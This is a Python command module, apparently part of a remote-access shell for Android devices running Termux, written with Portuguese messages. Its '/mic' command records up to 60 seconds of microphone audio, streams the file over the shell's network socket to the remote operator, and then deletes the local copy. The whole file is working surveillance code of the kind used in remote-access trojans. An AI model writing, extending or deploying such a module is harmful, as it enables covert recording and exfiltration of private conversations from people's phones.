import os
import subprocess

NAME = "/mic"
DESC = "grava audio do microfone e envia: /mic [segundos]"

DEFAULT_SECS = 5
MAX_SECS = 60


def run(shell, args):
    try:
        secs = int(args.strip()) if args.strip() else DEFAULT_SECS
    except ValueError:
        shell.socket.send(b"uso: /mic [segundos] (1-60)\n")
        return

    if secs < 1 or secs > MAX_SECS:
        shell.socket.send(f"erro: duracao deve ser 1-{MAX_SECS}s\n".encode())
        return

    path = "/data/data/com.termux/files/usr/tmp/rec.m4a"

    try:
        if os.path.exists(path):
            os.remove(path)

        cmd = subprocess.run(
            [
                "termux-microphone-record",
                "-f", path,
                "-l", str(secs),
            ],
            capture_output=True,
            text=True,
            timeout=secs + 15,
            stdin=subprocess.DEVNULL,
        )

        if cmd.returncode != 0 or not os.path.exists(path):
            msg = cmd.stderr or cmd.stdout or f"exit {cmd.returncode}"
            shell.socket.send(f"erro: {msg}\n".encode())
            return

        size = os.path.getsize(path)
        if size == 0:
            shell.socket.send(b"erro: gravacao vazia (microfone sem permissao?)\n")
            return

        header = f"FILE rec.m4a {size}\n"
        shell.socket.sendall(header.encode())

        enviado = 0
        with open(path, "rb") as f:
            while enviado < size:
                chunk = f.read(8192)
                if not chunk:
                    break
                shell.socket.sendall(chunk)
                enviado += len(chunk)

        shell.socket.sendall(b"\n")
        os.remove(path)

    except FileNotFoundError:
        shell.socket.send(b"erro: termux-microphone-record nao instalado\n")
    except subprocess.TimeoutExpired:
        shell.socket.send(b"erro: timeout (microfone travou ou sem permissao)\n")
    except Exception as e:
        shell.socket.send(f"erro: {e}\n".encode())
